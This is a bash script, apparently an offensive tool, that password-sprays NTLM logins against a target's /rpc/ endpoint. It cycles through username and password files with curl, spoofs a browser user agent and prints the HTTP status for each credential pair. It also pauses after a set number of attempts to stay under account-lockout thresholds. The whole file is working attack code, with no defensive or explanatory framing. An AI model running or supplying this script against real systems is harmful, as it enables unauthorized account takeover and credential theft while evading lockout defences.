#!/bin/bash

usernames=''
passwords=''
delay=''
host=''
port=443

usage() {
  echo ""
  echo "usage: $0 -u <userfile> -p <pwfile> -d <delay> -t <threshold> -h <host> [-P <port>]"
  echo ""
  echo "  userfile:  file containing usernames to try"
  echo "  pwfile:    file containing passwords to try"
  echo "  delay:     time to wait between login attempts for same user (in minutes!)"
  echo "  host:      host to target"
  echo "  port:      port to target (default: 443)"
  echo "  threshold: number of tries before sleeping"
  echo ""
  exit 1
}

while [ -n "$1" ]; do
  case "$1" in
    -u)
      shift; usernames="$1";;
    -p)
      shift; passwords="$1";;
    -d)
      shift; delay="$1";;
    -h)
      shift; host="$1";;
    -P)
      shift; port="$1";;
    -t)
      shift; threshold="$1";;
    *)
      echo "invalid switch: $1"
      usage;;
  esac
  shift
done

[ -z "$usernames" -o -z "$passwords" -o -z "$delay" -o -z "$host" ] && usage
[ ! -r "$usernames" ] && echo "error: cannot access $usernames" && exit 1
[ ! -r "$passwords" ] && echo "error: cannot access $passwords" && exit 1

sleeptime=$[ $delay * 60 ]
count=0
target="https://$host/rpc/"
agent="Mozilla/5.0"

cat $passwords | while read password ; do
    
    cat $usernames | while read username ; do 
      resp=$( curl -k -s -o /dev/null --ntlm -A $agent -u "$username:$password" $target -w '%{http_code}' )
      echo "[$resp] $username:$password"
    done
    
    let count=count+1
    if [ $( expr $count % $threshold ) -eq 0 ]; then
      echo "[***] Waiting $delay minutes before next cycle"
      sleep $sleeptime
    fi
done

echo "[***] Done."
